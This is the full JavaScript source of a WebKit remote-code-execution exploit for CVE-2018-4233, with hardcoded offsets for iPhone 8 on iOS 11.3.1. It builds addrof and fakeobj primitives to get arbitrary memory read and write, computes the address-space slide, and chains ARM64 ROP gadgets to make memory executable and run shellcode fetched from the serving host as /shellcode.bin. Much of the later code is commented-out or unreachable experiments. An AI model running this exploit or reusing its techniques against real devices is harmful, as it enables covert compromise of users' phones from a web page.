/*
 * Exploit by @_niklasb from phoenhex.
 *
 * This exploit uses CVE-2018-4233 (by saelo) to get RCE in WebContent.
 * The second stage is currently Ian Beer's empty_list kernel exploit,
 * adapted to use getattrlist() instead of fgetattrlist().
 *
 * Thanks to qwerty for some Mach-O tricks.
 *
 * Offsets hardcoded for iPhone 8, iOS 11.3.1.
 */
print = alert
ITERS = 10000
ALLOCS = 1000

var conversion_buffer = new ArrayBuffer(8)
var f64 = new Float64Array(conversion_buffer)
var i32 = new Uint32Array(conversion_buffer)

var BASE32 = 0x100000000
function f2i(f) {
    f64[0] = f
    return i32[0] + BASE32 * i32[1]
}

function i2f(i) {
    i32[0] = i % BASE32
    i32[1] = i / BASE32
    return f64[0]
}

function hexit(x) {
    if (x < 0)
        return `-${hex(-x)}`
    return `0x${x.toString(16)}`
}

function xor(a, b) {
    var res = 0, base = 1
    for (var i = 0; i < 64; ++i) {
        res += base * ((a&1) ^ (b&1))
        a = (a-(a&1))/2
        b = (b-(b&1))/2
        base *= 2
    }
    return res
}

function swap32(val) {
    return ((val & 0xFF) << 24)
           | ((val & 0xFF00) << 8)
           | ((val >> 8) & 0xFF00)
           | ((val >> 24) & 0xFF);
}

function fail(x) {
    print('FAIL ' + x)
    throw null
}

function make_compiled_function() {
    function target(x) {
        return x*5 + x - x*x;
    }
    // Call only once so that function gets compiled with low level interpreter
    // but none of the optimizing JITs
    target(0);
    return target;
}

function boring_func() {
    function target() {
        var value = 0x13371337
        return value
    }
    target()

    return target
}

counter = 0

// CVE-2018-4233
function trigger(constr, modify, res, val) {
    return eval(`
    var o = [13.37]
    var Constructor${counter} = function(o) { ${constr} }

    var hack = false

    var Wrapper = new Proxy(Constructor${counter}, {
        get: function() {
            if (hack) {
                ${modify}
            }
        }
    })

    for (var i = 0; i < ITERS; ++i)
        new Wrapper(o)

    hack = true
    var bar = new Wrapper(o)
    ${res}
    `)
}

// var workbuf = new ArrayBuffer(0x1000000)
// var u32_buffer = new Uint32Array(workbuf)
// var u8_buffer = new Uint8Array(workbuf)
var shellcode_buffer
var shellcode_length

function pwn() {
    var stage1 = {
        addrof: function(victim) {
            return f2i(trigger('this.result = o[0]', 'o[0] = val', 'bar.result', victim))
        },

        fakeobj: function(addr) {
            return trigger('o[0] = val', 'o[0] = {}', 'o[0]', i2f(addr))
        },

        test: function() {
            var addr = this.addrof({a: 0x1337})
            var x = this.fakeobj(addr)
            if (x.a != 0x1337) {
                fail(1)
            }
        },
    }

    // Sanity check
    stage1.test()

    var structs = [];
    function sprayStructures() {
        // The StructureIDTable can contain holes (these contain the index of the next free slot,
        // kind of like a freelist, just with indices). Since there could be a lot of free entries
        // in the table our spray must be somewhat large.
        function randomString() {
            return Math.random().toString(36).replace(/[^a-z]+/g, '').substr(0, 5);
        }
        for (var i = 0; i < 0x1000; i++) {
            var a = new Float64Array(1);
            // Add a new property to create a new Structure instance.
            a[randomString()] = 1337;
            structs.push(a);        // keep the Structure objects alive.
        }
    }

    // The plan is to
    // 0. Create a lot of Structures for Float64Array instances
    // 1. Setup a fake Float64Array inside another object's inline properties.
    //    The data pointer points into a Uint8Array.
    // 2. Since we don't know the correct structure ID of a Float64Array instance,
    //    we find it using 'instanceof'.
    // 3. We now have an arbitrary read+write primitive since we control the data pointer
    //    of an Uint8Array.
    // 4. We need to fix up a few things so the garbage collector won't crash the process.

    // Set up lot's of structures for Float64Array instances.
    sprayStructures();

    // Create the array that will be used to read and write arbitrary memory addresses.
    var hax = new Uint8Array(0x1000);

    // Create fake JSObject.
    // print("[*] Setting up container object");

    var jsCellHeader = new Int64([
        00, 0x10, 00, 00,       // m_structureID, current guess.
                                // JSC allocats a set of structures for non-JSObjects (Executables, regular expression objects, ...)
                                // during start up. Avoid these by picking a high initial ID.
        0x0,                    // m_indexingType, None
        0x27,                   // m_type, Float64Array (doesn't really matter, will be different for older versions)
        0x18,                   // m_flags, OverridesGetOwnPropertySlot | InterceptsGetOwnPropertySlotByIndexEvenWhenLengthIsNotZero
        0x1                     // m_cellState, NewWhite
    ]);

    var container = {
        jsCellHeader: jsCellHeader.asJSValue(),
        butterfly: false,       // Some arbitrary value, we'll fix this up at the end.
        vector: hax,
        lengthAndFlags: (new Int64('0x0001000000000010')).asJSValue()
    };

    // Create the fake Float64Array.
    var address = Add(stage1.addrof(container), 16);
    // print("[*] Fake JSObject @ " + address);

    var fakearray = stage1.fakeobj(address);

    // From now on until we've set the butterfly pointer to a sane value (i.e. nullptr)
    // a GC run would crash the process. Thus, operations performed now should be
    // as fast as possible.

    // Find a StructureID for a Float64Array instance.
    while (!(fakearray instanceof Float64Array)) {
        // Try to avoid heap allocations here, we don't want to trigger GC.
        jsCellHeader.assignAdd(jsCellHeader, Int64.One);
        container.jsCellHeader = jsCellHeader.asJSValue();
    }

    // Maybe shouldn't print stuff here.. :P
    // print("[*] Float64Array structure ID found: " + jsCellHeader.toString().substr(-8));

    //
    // We now have an arbitrary read+write primitive since we can overwrite the
    // data pointer of an Uint8Array with an arbitrary address.
    //
    // Optimization: force JIT compilation for these methods.
    //
    memory = {
        read: function(addr, length) {
            // print("[<] Reading " + length + " bytes from " + hexit(addr));
            fakearray[2] = i2f(addr);
            var a = new Array(length);
            for (var i = 0; i < length; i++)
                a[i] = hax[i];
            return a;
        },

        readInt64: function(addr) {
            return new Int64(this.read(addr, 8));
        },

        write: function(addr, data) {
            // print("[>] Writing " + data.length + " bytes to " + hexit(addr));
            fakearray[2] = i2f(addr);
            for (var i = 0; i < data.length; i++)
                hax[i] = data[i];
        },

        writeInt64: function(addr, val) {
            return this.write(addr, val.bytes());
        }
    };

    // Fixup the JSCell header of the container to make it look like an empty object.
    // By default, JSObjects have an inline capacity of 6, enough to hold the fake Float64Array.
    var empty = {};
    var header = memory.read(stage1.addrof(empty), 8);
    memory.write(stage1.addrof(container), header);

    // Copy the JSCell and Butterfly (will be nullptr) from an existing Float64Array.
    var f64array = new Float64Array(8);
    header = memory.read(stage1.addrof(f64array), 16);
    memory.write(stage1.addrof(fakearray), header);

    // Set valid flags as well: make it look like an OversizeTypedArray
    // for easy GC survival (see JSGenericTypedArrayView<Adaptor>::visitChildren).
    memory.write(Add(stage1.addrof(fakearray), 24), [0x10,0,0,0,1,0,0,0]);

    // Root the container object so it isn't garbage collected.
    // This will allocate a butterfly for the fake object and store a reference to the container there.
    // The fake array itself is rooted by the memory object (closures).
    fakearray.container = container;

    var wrapper = document.createElement('div')
    var wrapper_addr = stage1.addrof(wrapper)

    var el_addr = memory.readInt64(wrapper_addr + 0x18)
    var vtab = memory.readInt64(el_addr)

// regloader:
// 0x180ee6048      e00317aa       mov x0, x23
// 0x180ee604c      e10316aa       mov x1, x22
// 0x180ee6050      e20318aa       mov x2, x24
// 0x180ee6054      e30319aa       mov x3, x25
// 0x180ee6058      e4031aaa       mov x4, x26
// 0x180ee605c      e5031baa       mov x5, x27
// 0x180ee6060      80033fd6       blr x28

// dispatch:
// 0x180d62e48      a0023fd6       blr x21
// 0x180d62e4c      fd7b43a9       ldp x29, x30, [sp, 0x30]
// 0x180d62e50      f44f42a9       ldp x20, x19, [sp, 0x20]
// 0x180d62e54      f65741a9       ldp x22, x21, [sp, 0x10]
// 0x180d62e58      ff030191       add sp, sp, 0x40
// 0x180d62e5c      c0035fd6       ret

// stackloader
// 0x19331cfe0      fd7b46a9       ldp x29, x30, [sp, 0x60]
// 0x19331cfe4      f44f45a9       ldp x20, x19, [sp, 0x50]
// 0x19331cfe8      f65744a9       ldp x22, x21, [sp, 0x40]
// 0x19331cfec      f85f43a9       ldp x24, x23, [sp, 0x30]
// 0x19331cff0      fa6742a9       ldp x26, x25, [sp, 0x20]
// 0x19331cff4      fc6f41a9       ldp x28, x27, [sp, 0x10]
// 0x19331cff8      ffc30191       add sp, sp, 0x70
// 0x19331cffc      c0035fd6       ret

// __longjmp:
// 0x180700ad4      135040a9       ldp x19, x20, [x0]
// 0x180700ad8      155841a9       ldp x21, x22, [x0, 0x10]
// 0x180700adc      176042a9       ldp x23, x24, [x0, 0x20]
// 0x180700ae0      196843a9       ldp x25, x26, [x0, 0x30]
// 0x180700ae4      1b7044a9       ldp x27, x28, [x0, 0x40]
// 0x180700ae8      1d7845a9       ldp x29, x30, [x0, 0x50]
// 0x180700aec      1d0846a9       ldp x29, x2, [x0, 0x60]

Int64.prototype.lo = function()
{
    var b = this.bytes();
    return b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24);
};
Int64.prototype.hi = function()
{
    var b = this.bytes();
    return b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24);
};

var slide               = Sub(memory.readInt64(vtab), 0x186d68698); // some ptr in WebCore (PrivateFrameworks one)
var dlsym               = Add(0x18084ef90, slide);
var longjmp             = Add(0x180700ad4, slide);
var regloader           = Add(0x180ee6048, slide);
var dispatch            = Add(0x180d62e48, slide);
var stackloader         = Add(0x193318980, slide);
var mach_task_self      = Add(0x180623204, slide);
var mach_vm_protect     = Add(0x18062315c, slide);
var memmove             = Add(0x180700d60, slide);
var sleep               = Add(0x1805c9244, slide)
var memPoolEnd          = memory.readInt64(Add(0x1a79e69a0, slide));

memory.writeInt64(Add(vtab, 0x18), longjmp);
memory.writeInt64(Add(el_addr, 0x58), dispatch);        // x30 (gadget)
memory.writeInt64(Add(el_addr, 0x10), mach_task_self);  // x21 (func)

var arrsz = 0x10000,
    off   =  0x1000;
var arr = new Uint32Array(arrsz);
var mem = memory.readInt64(Add(stage1.addrof(arr), 0x10));

// shellcode
var shsz = 0x0;
// arr[shsz++] = 0xd28ccc00; // movz x0, 0x6660
// arr[shsz++] = 0xd61f0000; // br x0
    // arr[shsz++] = swap32(0xA0D59BD2);
    // arr[shsz++] = swap32(0xA1D59BD2);
    // arr[shsz++] = swap32(0xA2D59BD2);
    // arr[shsz++] = swap32(0xA3D59BD2);
    // arr[shsz++] = swap32(0xA4D59BD2);
    // arr[shsz++] = swap32(0xA5D59BD2);
    // arr[shsz++] = swap32(0xA6D59BD2);
    // arr[shsz++] = swap32(0xA7D59BD2);
    // arr[shsz++] = swap32(0xA8D59BD2);
    // arr[shsz++] = swap32(0xA9D59BD2);
    // arr[shsz++] = swap32(0xAAD59BD2);
    // arr[shsz++] = swap32(0xABD59BD2);
    // arr[shsz++] = swap32(0xACD59BD2);
    // arr[shsz++] = swap32(0xADD59BD2);
    // arr[shsz++] = swap32(0xAED59BD2);
    // arr[shsz++] = swap32(0xAFD59BD2);
    // arr[shsz++] = swap32(0xB0D59BD2);
    // arr[shsz++] = swap32(0xB1D59BD2);
    // arr[shsz++] = swap32(0xB2D59BD2);
    // arr[shsz++] = swap32(0xB3D59BD2);
    // arr[shsz++] = swap32(0xB4D59BD2);
    // arr[shsz++] = swap32(0xB5D59BD2);
    // arr[shsz++] = swap32(0xB6D59BD2);
    // arr[shsz++] = swap32(0xB7D59BD2);
    // arr[shsz++] = swap32(0xB8D59BD2);
    // arr[shsz++] = swap32(0xB9D59BD2);
    // arr[shsz++] = swap32(0xBAD59BD2);
    // arr[shsz++] = swap32(0xBBD59BD2);
    // arr[shsz++] = swap32(0xBCD59BD2);
    // arr[shsz++] = swap32(0x00001FD6);

// shsz = new Int64(shsz * 4);
shsz = new Int64(shellcode_length)
var codeAddr = Sub(memPoolEnd, 0x1000000);
print(`${hexit(memPoolEnd)} ${hexit(codeAddr)}`)

var shellcode_src = memory.readInt64(Add(stage1.addrof(shellcode_buffer), 0x10))
// var shellcode_src = Add(shellcode_src, 0x4000)
// print("leet? " + hexit(memory.readInt64(Add(shellcode_src, 0x4))))
memory.writeInt64(Add(shellcode_src, 0x4), new Int64(dlsym))
// print("shellcode src = " + hexit(shellcode_src))

var pos = arrsz - off;
// after dispatch:
arr[pos++] = 0xdead0000;                // unused
arr[pos++] = 0xdead0001;                // unused
arr[pos++] = 0xdead0002;                // unused
arr[pos++] = 0xdead0003;                // unused
arr[pos++] = 0xdead0004;                // x22 (unused)
arr[pos++] = 0xdead0005;                // x22 (unused)
arr[pos++] = 0xdead0006;                // x21 (unused)
arr[pos++] = 0xdead0007;                // x21 (unused)
arr[pos++] = 0xdead0008;                // x20 (unused)
arr[pos++] = 0xdead0009;                // x20 (unused)
arr[pos++] = 0xdead000a;                // x19 (unused)
arr[pos++] = 0xdead000b;                // x19 (unused)
arr[pos++] = 0xdead000c;                // x29 (unused)
arr[pos++] = 0xdead000d;                // x29 (unused)
arr[pos++] = stackloader.lo();          // x30 (gadget)
arr[pos++] = stackloader.hi();          // x30 (gadget)

// in stackloader:
arr[pos++] = 0xdead0010;                // unused
arr[pos++] = 0xdead0011;                // unused
arr[pos++] = 0xdead0012;                // unused
arr[pos++] = 0xdead0013;                // unused
arr[pos++] = dispatch.lo();             // x28 (gadget)
arr[pos++] = dispatch.hi();             // x28 (gadget)
arr[pos++] = 0xdead0014;                // x27 == x5 (unused)
arr[pos++] = 0xdead0015;                // x27 == x5 (unused)
arr[pos++] = 7;                         // x26 == x4 (prot)
arr[pos++] = 7;                         // x26 == x4 (prot)
arr[pos++] = 0;                         // x25 == x3 (max flag)
arr[pos++] = 0;                         // x25 == x3 (max flag)
arr[pos++] = shsz.lo();                 // x24 == x2 (size)
arr[pos++] = shsz.hi();                 // x24 == x2 (size)
arr[pos++] = 0xdead0016;                // x23 == x0 (skipped)
arr[pos++] = 0xdead0017;                // x23 == x0 (skipped)
arr[pos++] = codeAddr.lo();             // x22 == x1 (addr)
arr[pos++] = codeAddr.hi();             // x22 == x1 (addr)
arr[pos++] = mach_vm_protect.lo();      // x21 (func)
arr[pos++] = mach_vm_protect.hi();      // x21 (func)
arr[pos++] = 0xdead0018;                // x20 (unused)
arr[pos++] = 0xdead0019;                // x20 (unused)
arr[pos++] = 0xdead001a;                // x19 (unused)
arr[pos++] = 0xdead001b;                // x19 (unused)
arr[pos++] = 0xdead001c;                // x29 (unused)
arr[pos++] = 0xdead001d;                // x29 (unused)
// Need to skip the first instruction (4 bytes) of regloader because we already have x0
arr[pos++] = Add(regloader, 0x4).lo();  // x30 (gadget)
arr[pos++] = Add(regloader, 0x4).hi();  // x30 (gadget)

// after dispatch:
arr[pos++] = 0xdead0020;                // unused
arr[pos++] = 0xdead0021;                // unused
arr[pos++] = 0xdead0022;                // unused
arr[pos++] = 0xdead0023;                // unused
arr[pos++] = 0xdead0024;                // x22 (unused)
arr[pos++] = 0xdead0025;                // x22 (unused)
arr[pos++] = 0xdead0026;                // x21 (unused)
arr[pos++] = 0xdead0027;                // x21 (unused)
arr[pos++] = 0xdead0028;                // x20 (unused)
arr[pos++] = 0xdead0029;                // x20 (unused)
arr[pos++] = 0xdead002a;                // x19 (unused)
arr[pos++] = 0xdead002b;                // x19 (unused)
arr[pos++] = 0xdead002c;                // x29 (unused)
arr[pos++] = 0xdead002d;                // x29 (unused)
arr[pos++] = stackloader.lo();          // x30 (gadget)
arr[pos++] = stackloader.hi();          // x30 (gadget)

// in stackloader:
arr[pos++] = 0xdead0030;                // unused
arr[pos++] = 0xdead0031;                // unused
arr[pos++] = 0xdead0032;                // unused
arr[pos++] = 0xdead0033;                // unused
arr[pos++] = dispatch.lo();             // x28 (gadget)
arr[pos++] = dispatch.hi();             // x28 (gadget)
arr[pos++] = 0xdead0034;                // x27 == x5 (unused)
arr[pos++] = 0xdead0035;                // x27 == x5 (unused)
arr[pos++] = 0xdead0036;                // x26 == x4 (unused)
arr[pos++] = 0xdead0037;                // x26 == x4 (unused)
arr[pos++] = 0xdead0038;                // x25 == x3 (unused)
arr[pos++] = 0xdead0039;                // x25 == x3 (unused)
arr[pos++] = shsz.lo();                 // x24 == x2 (size)
arr[pos++] = shsz.hi();                 // x24 == x2 (size)
arr[pos++] = codeAddr.lo();             // x23 == x0 (dst)
arr[pos++] = codeAddr.hi();             // x23 == x0 (dst)
arr[pos++] = shellcode_src.lo();                  // x22 == x1 (src)
arr[pos++] = shellcode_src.hi();                  // x22 == x1 (src)
arr[pos++] = memmove.lo();              // x21 (func)
arr[pos++] = memmove.hi();              // x21 (func)
arr[pos++] = 0xdead003a;                // x20 (unused)
arr[pos++] = 0xdead003b;                // x20 (unused)
arr[pos++] = 0xdead003c;                // x19 (unused)
arr[pos++] = 0xdead003d;                // x19 (unused)
arr[pos++] = 0xdead003e;                // x29 (unused)
arr[pos++] = 0xdead003f;                // x29 (unused)
arr[pos++] = regloader.lo();            // x30 (gadget)
arr[pos++] = regloader.hi();            // x30 (gadget)

    // after dispatch:
    arr[pos++] = 0xdead0040;                // unused
    arr[pos++] = 0xdead0041;                // unused
    arr[pos++] = 0xdead0042;                // unused
    arr[pos++] = 0xdead0043;                // unused
    arr[pos++] = 0xdead0044;                // x22 (unused)
    arr[pos++] = 0xdead0045;                // x22 (unused)
    arr[pos++] = 0xdead0046;                // x21 (unused)
    arr[pos++] = 0xdead0047;                // x21 (unused)
    arr[pos++] = 0xdead0048;                // x20 (unused)
    arr[pos++] = 0xdead0049;                // x20 (unused)
    arr[pos++] = 0xdead004a;                // x19 (unused)
    arr[pos++] = 0xdead004b;                // x19 (unused)
    arr[pos++] = 0xdead004c;                // x29 (unused)
    arr[pos++] = 0xdead004d;                // x29 (unused)
    arr[pos++] = stackloader.lo();          // x30 (gadget)
    arr[pos++] = stackloader.hi();          // x30 (gadget)

    // in stackloader:
    arr[pos++] = 0xdead0050;                // unused
    arr[pos++] = 0xdead0051;                // unused
    arr[pos++] = 0xdead0052;                // unused
    arr[pos++] = 0xdead0053;                // unused
    arr[pos++] = dispatch.lo();             // x28 (gadget)
    arr[pos++] = dispatch.hi();             // x28 (gadget)
    arr[pos++] = 0xdead0054;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0055;                // x27 == x5 (unused)
    arr[pos++] = 0xdead0056;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0057;                // x26 == x4 (unused)
    arr[pos++] = 0xdead0058;                // x25 == x3 (unused)
    arr[pos++] = 0xdead0059;                // x25 == x3 (unused)
    arr[pos++] = 0xdead005a;                // x24 == x2 (unused)
    arr[pos++] = 0xdead005b;                // x24 == x2 (unused)
    arr[pos++] = 1;                         // x23 == x0 (seconds)
    arr[pos++] = 0;                         // x23 == x0 (seconds)
    arr[pos++] = 0xdead005c;                // x22 == x1 (unused)
    arr[pos++] = 0xdead005d;                // x22 == x1 (unused)
    arr[pos++] = sleep.lo();                // x21 (func)
    arr[pos++] = sleep.hi();                // x21 (func)
    arr[pos++] = 0xdead005e;                // x20 (unused)
    arr[pos++] = 0xdead005f;                // x20 (unused)
    arr[pos++] = 0xdead0060;                // x19 (unused)
    arr[pos++] = 0xdead0061;                // x19 (unused)
    arr[pos++] = 0xdead0062;                // x29 (unused)
    arr[pos++] = 0xdead0063;                // x29 (unused)
    arr[pos++] = regloader.lo();            // x30 (gadget)
    arr[pos++] = regloader.hi();            // x30 (gadget)

// after dispatch:
arr[pos++] = 0xdead0040;                // unused
arr[pos++] = 0xdead0041;                // unused
arr[pos++] = 0xdead0042;                // unused
arr[pos++] = 0xdead0043;                // unused
arr[pos++] = 0xdead0044;                // x22
arr[pos++] = 0xdead0045;                // x22
arr[pos++] = 0xdead0046;                // x21
arr[pos++] = 0xdead0047;                // x21
arr[pos++] = 0xdead0048;                // x20
arr[pos++] = 0xdead0049;                // x20
arr[pos++] = 0xdead004a;                // x19
arr[pos++] = 0xdead004b;                // x19
arr[pos++] = 0xdead774c;                // x29
arr[pos++] = 0xdead884d;                // x29
arr[pos++] = codeAddr.lo();             // x30 (shellcode)
arr[pos++] = codeAddr.hi();             // x30 (shellcode)

// dummy
for(var i = 0; i < 0x20; ++i)
{
    arr[pos++] = 0xdeadc0de;
}

var sp = Add(mem, (arrsz - off) * 4);
memory.writeInt64(Add(el_addr, 0x68), sp);      // x2 (copied into sp)

// trigger
wrapper.addEventListener('click', function() { })

print("should never reach this")

    // longjmp
    // ldp x19, x20, [x0]
    // ldp x21, x22, [x0, 0x10]
    // ldp x23, x24, [x0, 0x20]
    // ldp x25, x26, [x0, 0x30]
    // ldp x29, x30, [x0, 0x50]
    // ldp x29, x2, [x0, 0x60]
    // ldp d8, d9, [x0, 0x70]
    // ldp d10, d11, [x0, 0x80]
    // ldp d12, d13, [x0, 0x90]
    // ldp d14, d15, [x0, 0xa0]
    // mov sp, x2
    // mov x0, x1
    // cmp x0, 0
    // b.ne 0x180700b14
    // add x0, x0, 1
    // ret

    // ret fixer 0x180d62e48
    // blr x21
    // ldp x29, x30, [sp, 0x30]
    // ldp x20, x19, [sp, 0x20]
    // ldp x22, x21, [sp, 0x10]
    // add sp, sp, 0x40
    // ret

    // amazing reg loader 0x180aadf58
    // mov x0, x25
    // mov x1, x22
    // mov x2, x26
    // mov x3, x27
    // mov x4, x21
    // mov x5, x23
    // blr x20

    // call mprotect via ROP

    // TO EXEC ROP CHAIN : memory.writeInt64(Add(vtab, 24), new Int64(0))

    // var startOfFixedExecutableMemoryPool = memory.readInt64(0x1A79E6998 + slide)
    // var endOfFixedExecutableMemoryPool = memory.readInt64(0x1A79E69A0 + slide)

    // var buffer_addr = memory.readInt64(stage1.addrof(u32_buffer) + 0x10)

    // var shellcode_src = buffer_addr + 0x4000
    // var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000
    // // print("execPool size = " + hexit(endOfFixedExecutableMemoryPool - startOfFixedExecutableMemoryPool))
    // print("buff = " + hexit(shellcode_dst))
    // if (shellcode_dst < startOfFixedExecutableMemoryPool) {
    //     fail(4)
    // }

    // var dlsym = 0x18084ef90 + slide
    // var longjmp = 0x180b12778 + slide

    // var val_to_x1_gadget = 0x18329F61C + slide
    // var mprotect = 0x180640940 + slide

    // memory.writeInt64(shellcode_src + 4, new Int64(dlsym))

    // print("write @ " + hexit(codeAddr))
    // memory.write(codeAddr, [ 0x20, 0xA7, 0x80, 0xD2, 0xC0, 0x03, 0x5F, 0xD6 ])
    // // memory.writeInt64(shellcode_dst, new Int64(0))

    // print("ret = " + func())

    return

    memory.writeInt64(Add(vtab, 24), new Int64(val_to_x1_gadget))
    print("vtab = " + hexit(memory.readInt64(Add(vtab, 24))))

    print("see you ont he other side")
    // rint("val = " + wrapper.addEventListener('click', function(){}))

    return

    
    // print("vtab val = " + memory.readInt64(vtab))

    // for (var i = 0; i <= 8 * 3; i += 8) {
    //     memory.writeInt64(Add(vtab, i), new Int64(0))
    // }

    // memory.writeInt64(Add(vtab, 24), new Int64(0))

    // var str = ""
    // for (var i = 0; i <= 0x40; i += 8) {
    //     str += `vtab(${i}) = ${memory.readInt64(Add(vtab, i))}\n`
    // }
    // print(str)

   

    

    return

    // print("slide = " + hexit(slide))

    // JSC base within dyld shared cache is 0x18551D000
    // print("val = " + hexit(memory.readInt64(0x18551D000 + slide)))

    var longjmp = 0x180b126e8 + slide
    var dlsym = 0x01A79EB7A8 + slide

    

    var ptr_stack_check_guard = 0x1ac3efc40 + slide

    // ModelIO:0x000000018d2f6564 :
    //   ldr x8, [sp, #0x28]
    //   ldr x0, [x8, #0x18]
    //   ldp x29, x30, [sp, #0x50]
    //   add sp, sp, #0x60
    //   ret
    var pop_x8 = 0x18d2f6564 + slide

    // CoreAudio:0x000000018409ddbc
    //   ldr x2, [sp, #8]
    //   mov x0, x2
    //   ldp x29, x30, [sp, #0x10]
    //   add sp, sp, #0x20
    //   ret
    var pop_x2 = 0x18409ddbc + slide

    // see jitcode.s
    var linkcode_gadget = 0x187bd18c8 + slide

    //print('base @ ' + hex(base)
        //+ '\ndisablePrimitiveGigacage @ ' + hex(disablePrimitiveGigacage)
        //+ '\ng_gigacageBasePtrs @ ' + hex(g_gigacageBasePtrs)
        //+ '\ng_typedArrayPoisons @ ' + hex(g_typedArrayPoisons)
        //+ '\nstartOfFixedExecutableMemoryPool @ ' + hex(startOfFixedExecutableMemoryPool)
        //+ '\nendOfFixedExecutableMemoryPool @ ' + hex(endOfFixedExecutableMemoryPool)
        //+ '\njitWriteSeparateHeapsFunction @ ' + hex(jitWriteSeparateHeapsFunction)
        //+ '\nuseFastPermisionsJITCopy @ ' + hex(useFastPermisionsJITCopy)
        //)

    var buffer_addr = memory.readInt64(stage1.addrof(u32_buffer) + 0x18)

    var shellcode_src = buffer_addr + 0x4000
    var shellcode_dst = endOfFixedExecutableMemoryPool - 0x1000000
    if (shellcode_dst < startOfFixedExecutableMemoryPool) {
        print("shellcode_dst = " + hexit(shellcode_dst) + "\n" +
              "startOfFixedExec = " + hexit(startOfFixedExecutableMemoryPool))
        fail(4)
    }
    memory.writeInt64(shellcode_src + 4, new Int64(dlsym, 8))

    memory.write(vtab, shellcode_src, shellcode_src, shellcode_src)

    // var fake_stack = [
    //     0,
    //     shellcode_length,  // x2
    //     0,

    //     pop_x8,

    //     0, 0, 0, 0, 0,
    //     shellcode_dst, // x8
    //     0, 0, 0, 0,
    //     // stage2.read64(ptr_stack_check_guard) + 0x58,
    //     0, // i hope replacing this is right XXXXXX

    //     linkcode_gadget,
    //     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
    //     0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,

    //     shellcode_dst,
    // ]

    // // Set up fake vtable at offset 0
    // // u32_buffer[0] = longjmp % BASE32
    // // u32_buffer[1] = longjmp / BASE32

    // // Set up fake stack at offset 0x2000
    // for (var i = 0; i < fake_stack.length; ++i) {
    //     u32_buffer[0x2000/4 + 2*i] = fake_stack[i] % BASE32
    //     u32_buffer[0x2000/4 + 2*i+1] = fake_stack[i] / BASE32
    // }

    // memory.write(el_addr, [
    //     buffer_addr, // fake vtable
    //     0,
    //     shellcode_src, // x21
    //     0, 0, 0, 0, 0, 0, 0,
    //     0, // fp

    //     pop_x2, // lr
    //     0,
    //     buffer_addr + 0x2000, // sp
    // ])
    //print('shellcode @ ' + hex(shellcode_dst))
    print('see you on the other side')
    wrapper.addEventListener('click', function(){})
}

function print_error(e) {
    print('Error: ' + e + '\n' + e.stack)
}

function go() {
    fetch('/shellcode.bin').then((response) => {
        response.arrayBuffer().then((buffer) => {
            try {
                shellcode_length = buffer.byteLength
                if (shellcode_length > 0x1000000) {
                    fail(5)
                }
                shellcode_buffer = new Uint32Array(buffer)
                // shellcode_buffer.set(buffer, 0x0)
                // u8_buffer.set(new Uint8Array(buffer), 0x4000)
                //print('got ' + shellcode_length + ' bytes of shellcode, pwning')
                pwn()
            } catch (e) {
                print_error(e)
            }
        })
    })
}
